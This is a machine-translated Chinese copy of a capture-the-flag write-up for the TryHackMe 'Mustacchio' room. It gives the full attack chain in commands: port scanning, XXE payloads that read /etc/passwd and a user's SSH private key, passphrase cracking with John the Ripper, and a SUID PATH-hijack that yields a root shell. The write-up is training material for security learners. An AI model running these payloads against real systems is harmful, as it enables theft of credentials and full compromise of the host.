<html>
<head>
<title>TryHackMe Writeup: Mustacchio</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe报道:穆斯塔基奥</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-writeup-mustacchio-ee526a543d8a?source=collection_archive---------1-----------------------#2021-06-15">https://infosecwriteups.com/tryhackme-writeup-mustacchio-ee526a543d8a?source=collection_archive---------1-----------------------#2021-06-15</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="9577" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">本文介绍了我解决<strong class="jp ir">穆斯塔基奥</strong>夺旗(CTF) <strong class="jp ir"> </strong>挑战、<strong class="jp ir"> </strong>用户<em class="kl"> zyeinn </em>在TryHackMe平台上创建的免费房间的方法。我在下面的参考资料中提供了TryHackMe平台的链接，供有兴趣尝试这款CTF的人使用。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi km"><img src="../Images/570d9913a6ea034373712a119e39af5d.png" data-original-src="https://miro.medium.com/v2/resize:fit:606/format:webp/1*rBWLvpdui6Vx9gw7if2VzA.png"/></div></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="1800" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">放弃</h1><p id="0ccb" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">我喜欢在一篇文章之前添加一个简短的免责声明，以鼓励人们在阅读本文之前尝试一下这个房间，因为在这篇文章中显然会有<strong class="jp ir">剧透</strong><strong class="jp ir"/>。我相信，如果你先自己尝试，然后在遇到困难或需要提示时再来写这篇文章，你会更喜欢CTF。因此，没有任何进一步的拖延，让我们开始吧！</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="f71f" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">挑战简介</h1><blockquote class="me mf mg"><p id="bd43" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">部署并破坏机器！</p></blockquote><p id="e3b7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要完成挑战，需要提交两个标志:</p><ul class=""><li id="2002" class="mk ml iq jp b jq jr ju jv jy mm kc mn kg mo kk mp mq mr ms bi translated"><strong class="jp ir">用户标志</strong></li><li id="6462" class="mk ml iq jp b jq mt ju mu jy mv kc mw kg mx kk mp mq mr ms bi translated"><strong class="jp ir">根标志</strong></li></ul></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="7b70" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">列举</h1><p id="e762" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">我开始用NMAP扫描所有打开的端口来枚举目标机器:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="158b" class="nd lc iq mz b gy ne nf l ng nh">nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.255.169</span><span id="e570" class="nd lc iq mz b gy ni nf l ng nh">PORT     STATE SERVICE        REASON<br/>22/tcp   open  ssh            syn-ack ttl 61<br/>80/tcp   open  http           syn-ack ttl 61<br/>8765/tcp open  ultraseek-http syn-ack ttl 61</span></pre><p id="89cc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我看到扫描发现三个端口打开(即22、80和8765)。接下来，我使用NMAP扫描运行在这些端口和NMAP脚本上的服务，以找到任何常见的漏洞:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="e3b0" class="nd lc iq mz b gy ne nf l ng nh">nmap -sV -sC -Pn -v -p 22,80,8765 -oN nmap-report 10.10.225.169</span><span id="a75f" class="nd lc iq mz b gy ni nf l ng nh">PORT     STATE SERVICE VERSION<br/>22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)<br/>| ssh-hostkey: <br/>|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)<br/>|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)<br/>|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)<br/>80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))<br/>| http-methods: <br/>|_  Supported Methods: GET HEAD POST OPTIONS<br/>| http-robots.txt: 1 disallowed entry <br/>|_/<br/>|_http-server-header: Apache/2.4.18 (Ubuntu)<br/>|_http-title: Mustacchio | Home<br/>8765/tcp open  http    nginx 1.10.3 (Ubuntu)<br/>| http-methods: <br/>|_  Supported Methods: GET HEAD POST<br/>|_http-server-header: nginx/1.10.3 (Ubuntu)<br/>|_http-title: Mustacchio | Login<br/>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></pre><p id="3460" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">NMAP扫描完成后，我可以看到端口80和端口8765上有两个可用的网站。</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="c09d" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">端口80 — HTTP网站分析</h1><p id="fed1" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">我首先检查了端口80上可用的网站，并使用<strong class="jp ir"> FFuF </strong>对其进行模糊处理，以查找任何隐藏的文件或目录:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="45de" class="nd lc iq mz b gy ne nf l ng nh">ffuf -c -u <a class="ae nj" href="http://10.10.225.169/FUZZ" rel="noopener ugc nofollow" target="_blank">http://10.10.225.169/FUZZ</a> -w /usr/share/wordlists/dirb/common.txt -e .php,.old,.bak</span><span id="b1a8" class="nd lc iq mz b gy ni nf l ng nh">custom  [Status: 301, Size: 315, Words: 20, Lines: 10] # Interesting<br/>fonts   [Status: 301, Size: 314, Words: 20, Lines: 10]<br/>images  [Status: 301, Size: 315, Words: 20, Lines: 10]<br/>index.html     [Status: 200, Size: 1752, Words: 77, Lines: 73]<br/>robots.txt     [Status: 200, Size: 28, Words: 3, Lines: 3]<br/>server-status  [Status: 403, Size: 278, Words: 20, Lines: 10]</span></pre><p id="b395" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">翻看上面的输出，看到一个名为<em class="kl">/custom</em><em class="kl"/>的目录，在目录中找到一个名为<strong class="jp ir"> users.bak </strong>的文件。我下载了该文件，可以看到它是一个SQLite数据库文件:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="a075" class="nd lc iq mz b gy ne nf l ng nh">$ file users.bak</span><span id="6da1" class="nd lc iq mz b gy ni nf l ng nh">users.bak: SQLite 3.x database, last written using SQLite version 3034001</span></pre><p id="f94e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在数据库里面，我找到了一个<strong class="jp ir">用户名</strong>和<strong class="jp ir"> SHA1哈希</strong>。我用一个在线工具破解了这个SHA1散列，找回了用户的密码:</p><p id="4da6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae nj" href="https://hashtoolkit.com/decrypt-sha1-hash/" rel="noopener ugc nofollow" target="_blank">https://hashtoolkit.com/decrypt-sha1-hash/</a></p><p id="adf5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我的第一反应是使用这些凭证SSH到目标机器，但是这不起作用。</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="5caa" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">端口8765 — XML外部实体(XEE)注入</h1><p id="9717" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">我转到端口8765上的网站，找到了一个管理员登录面板:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/3efe9a76621980d7c65dd300405c5d43.png" data-original-src="https://miro.medium.com/v2/resize:fit:944/format:webp/1*abT0oaCPVaTe9SQYeUGXJA.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">管理员登录面板</figcaption></figure><p id="778e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用前面发现的凭证，我可以登录到管理面板，并看到一个用于提交评论的网页表单:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi np"><img src="../Images/3ac916e9d4db358964db85ee38b43ea9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1174/format:webp/1*DM5sB-tqqIGLiKSHBHK2mg.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">用于添加注释的Web表单</figcaption></figure><p id="8fe9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">浏览网页源代码，我发现了一些有趣的信息。第一个是一段JavaScript，它有一个包含URL的注释(例如，<em class="kl"> /auth/dontforget.bak </em>)。脚本的其余部分检查提交输入的区域是否为空，如果是，创建一个警告框，告诉用户<strong class="jp ir">插入XML代码。</strong>这暗示了网站容易受到XML注入的攻击:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="f538" class="nd lc iq mz b gy ne nf l ng nh">&lt;script type="text/javascript"&gt;<br/>      //document.cookie = "Example=/auth/dontforget.bak"; <br/>      function checktarea() {<br/>      let tbox = document.getElementById("box").value;<br/>      if (tbox == null || tbox.length == 0) {<br/>        alert("Insert XML Code!")<br/>      }<br/>  }<br/>&lt;/script&gt;</span></pre><p id="4726" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用上面找到的URL，我可以下载<strong class="jp ir">don tfore . bak</strong>文件，并看到网站用于添加评论的XML结构:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="3496" class="nd lc iq mz b gy ne nf l ng nh">&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;comment&gt;<br/>  &lt;name&gt;Joe Hamd&lt;/name&gt;<br/>  &lt;author&gt;Barry Clad&lt;/author&gt;<br/>  &lt;com&gt;his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.&lt;/com&gt;<br/>&lt;/comment&gt;</span></pre><p id="f327" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">另一条有趣的信息是一个开发者的评论，称一个名为<strong class="jp ir"> Barry </strong>的用户可以使用他的密钥SSH到目标机器。</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="0157" class="nd lc iq mz b gy ne nf l ng nh">&lt;!-- Barry, you can now SSH in using your key!--&gt;</span></pre><p id="f99d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用上面收集的信息，我现在可以准备利用网站中的XML注入漏洞了。我发现以下资源对于学习更多关于XML注入的知识很有用:</p><div class="nq nr gp gr ns nt"><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity" rel="noopener  ugc nofollow" target="_blank"><div class="nu ab fo"><div class="nv ab nw cl cj nx"><h2 class="bd ir gy z fp ny fr fs nz fu fw ip bi translated">XXE - XEE - XML外部实体</h2><div class="oa l"><h3 class="bd b gy z fp ny fr fs nz fu fw dk translated">XML实体是在XML文档中表示数据项的一种方式，而不是使用数据本身…</h3></div><div class="ob l"><p class="bd b dl z fp ny fr fs nz fu fw dk translated">book.hacktricks.xyz</p></div></div><div class="oc l"><div class="od l oe of og oc oh ks nt"/></div></div></a></div><p id="64e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我从执行新实体测试开始，以确定简单的新实体声明是否可行。为了实现这一点，我确保使用前面在<strong class="jp ir">don tform et . bak</strong>文件中看到的XML结构。对于下面的XML，当XML解析器解析外部实体时，结果应该包含<em class="kl"> &lt; name &gt; </em>中的“Joe Hamd”和<em class="kl"> &lt; author &gt; </em>中的“XML Injection”:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="3f31" class="nd lc iq mz b gy ne nf l ng nh">&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;!DOCTYPE replace [&lt;!ENTITY example "XML Injection"&gt; ]&gt;<br/>&lt;comment&gt;<br/>  &lt;name&gt;Joe Hamd&lt;/name&gt;<br/>  &lt;author&gt;&amp;example;&lt;/author&gt;<br/>&lt;com&gt;Test paragraph&lt;/com&gt;<br/>&lt;/comment&gt;</span></pre><p id="0d96" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是可行的，我可以看到预期的输出:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/2d49ed3925d8e0a825eafc4a57bff730.png" data-original-src="https://miro.medium.com/v2/resize:fit:1076/format:webp/1*dD8W4yK3HwBu8u8XNtgyIQ.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">新实体攻击</figcaption></figure><p id="0bec" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来，我试着看看是否可以读取文件<em class="kl"> /etc/passwd </em>的内容:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="a144" class="nd lc iq mz b gy ne nf l ng nh">&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;<br/>&lt;comment&gt;<br/>  &lt;name&gt;Joe Hamd&lt;/name&gt;<br/>  &lt;author&gt;Joe&lt;/author&gt;<br/>&lt;com&gt;&amp;xxe;&lt;/com&gt;<br/>&lt;/comment&gt;</span></pre><p id="7343" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这也是成功的，因为我可以看到<em class="kl"> /etc/passwd </em>文件的内容:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/10b95a66dcbabc096ec48cee743fa807.png" data-original-src="https://miro.medium.com/v2/resize:fit:1266/format:webp/1*h8d0wK6BSJrsN3E8A7gKDQ.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">读取/etc/passwd文件内容</figcaption></figure><p id="88b2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我已经确认我可以读取文件，下一步是根据前面找到的开发人员注释检索用户Barry的SSH密钥:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="ac71" class="nd lc iq mz b gy ne nf l ng nh">&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM 'file:////home/barry/.ssh/id_rsa'&gt;]&gt;<br/>&lt;comment&gt;<br/>  &lt;name&gt;Joe Hamd&lt;/name&gt;<br/>  &lt;author&gt;Joe&lt;/author&gt;<br/>&lt;com&gt;&amp;xxe;&lt;/com&gt;<br/>&lt;/comment&gt;</span></pre><p id="c85f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用上面的XML注入，我能够检索SSH密钥:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/64e07a4448747eb01fac508fae5c7d5d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1304/format:webp/1*Ed-Uu3Hw1N3X1LUpJjKaYQ.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">检索用户Barry的SSH密钥</figcaption></figure><p id="4821" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我有了SSH密钥，我更改了密钥的权限并尝试登录，但是系统提示我输入密码:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="c3c1" class="nd lc iq mz b gy ne nf l ng nh">$ chmod 600 id_rsa</span><span id="4259" class="nd lc iq mz b gy ni nf l ng nh">$ ssh -i id_rsa barry@10.10.225.169<br/>Enter passphrase for key 'id_rsa':</span></pre><p id="079e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了检索SSH密钥的密码，我使用开膛手约翰来破解它:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="5af0" class="nd lc iq mz b gy ne nf l ng nh"># Create a hash for John to crack<br/>$ python /usr/share/john/ssh2john.py id_rsa &gt; id_rsa.hash</span><span id="7374" class="nd lc iq mz b gy ni nf l ng nh"># Crack the Hash<br/>$ sudo john id_rsa.hash -wordlist=/home/kali/Downloads/Capture-The-Flag/Password-Lists/rockyou.txt</span></pre><p id="14a2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">开膛手约翰成功地从哈希中检索到了密码短语。我能够SSH到目标机器并获得用户标志:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="c5aa" class="nd lc iq mz b gy ne nf l ng nh">barry@mustacchio:~$ cat user.txt</span><span id="8923" class="nd lc iq mz b gy ni nf l ng nh">62d77a4d5f97d.........</span></pre></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="40bc" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">根权限提升-路径变量</h1><p id="b3e9" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">获得用户标志后，我开始寻找一种方法来提升我的特权到root。我在用户<em class="kl"> /home/joe </em>目录下发现了一个名为<strong class="jp ir"> live_log </strong>的ELF二进制文件:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="ad13" class="nd lc iq mz b gy ne nf l ng nh">$ file live_log </span><span id="f945" class="nd lc iq mz b gy ni nf l ng nh">live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped</span></pre><p id="57af" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用<strong class="jp ir"> strings </strong>命令，我可以看到二进制文件正在使用<strong class="jp ir"> tail </strong>命令读取<em class="kl">/var/log/nginx/access . log</em>文件中的最后10个条目:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="36e1" class="nd lc iq mz b gy ne nf l ng nh">_ITM_registerTMCloneTable<br/>u+UH<br/>[]A\A]A^A_<br/>Live Nginx Log Reader<br/>tail -f /var/log/nginx/access.log  &lt;--- Interesting<br/>:*3$"<br/>GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0<br/>crtstuff.c</span></pre><p id="b60b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我可以看到为文件设置了<strong class="jp ir"> SUID位</strong>,并且它使用了<strong class="jp ir">尾</strong>二进制，但没有指定完整路径。我们可以通过创建一个新的二进制文件并编辑$PATH环境变量来生成一个根shell。我发现以下资源有助于了解利用此漏洞的更多信息:</p><div class="nq nr gp gr ns nt"><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" rel="noopener  ugc nofollow" target="_blank"><div class="nu ab fo"><div class="nv ab nw cl cj nx"><h2 class="bd ir gy z fp ny fr fs nz fu fw ip bi translated">使用路径变量提升Linux权限</h2><div class="oa l"><h3 class="bd b gy z fp ny fr fs nz fu fw dk translated">在解决了几个OSCP挑战之后，我们决定写一篇关于用于Linux的各种方法的文章…</h3></div><div class="ob l"><p class="bd b dl z fp ny fr fs nz fu fw dk translated">www.hackingarticles.in</p></div></div><div class="oc l"><div class="ol l oe of og oc oh ks nt"/></div></div></a></div><p id="5305" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了生成一个根shell，我在<em class="kl"> /tmp </em>文件夹中创建了一个名为<strong class="jp ir"> tail、</strong>的文件，当执行该文件时将生成一个shell。然后，我编辑$PATH变量，指向我创建文件的位置。一旦我完成了这个过程，我再次执行了<strong class="jp ir"> live_log </strong> ELF二进制文件，这产生了一个根shell:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="cca5" class="nd lc iq mz b gy ne nf l ng nh">barry@mustacchio:~$ echo $PATH<br/>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin<br/>barry@mustacchio:~$ cd /tmp<br/>barry@mustacchio:/tmp$ echo "/bin/bash" &gt; tail<br/>barry@mustacchio:/tmp$ chmod 777 tail<br/>barry@mustacchio:/tmp$ export PATH=/tmp:$PATH<br/>barry@mustacchio:/tmp$ cd /home/joe/<br/>barry@mustacchio:/home/joe$ ./live_log <br/>root@mustacchio:/home/joe#</span></pre><p id="fdf7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，我可以拿到根旗并完成挑战。</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="c4bf" class="nd lc iq mz b gy ne nf l ng nh">root@mustacchio:/home/joe# cat /root/root.txt<br/>3223581420d9.........</span></pre></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="7bc4" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">结束语</h1><p id="12c7" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">我真的很喜欢在这台机器上工作，并且有机会学习更多关于XML注入攻击的知识。谢谢你一直读到最后，继续黑下去😄！</p><div class="nq nr gp gr ns nt"><a href="https://tryhackme.com/" rel="noopener  ugc nofollow" target="_blank"><div class="nu ab fo"><div class="nv ab nw cl cj nx"><h2 class="bd ir gy z fp ny fr fs nz fu fw ip bi translated">网络安全培训</h2><div class="oa l"><h3 class="bd b gy z fp ny fr fs nz fu fw dk translated">TryHackMe是一个免费的学习网络安全的在线平台，使用动手练习和实验室，通过您的…</h3></div><div class="ob l"><p class="bd b dl z fp ny fr fs nz fu fw dk translated">tryhackme.com</p></div></div><div class="oc l"><div class="om l oe of og oc oh ks nt"/></div></div></a></div></div></div>    
</body>
</html>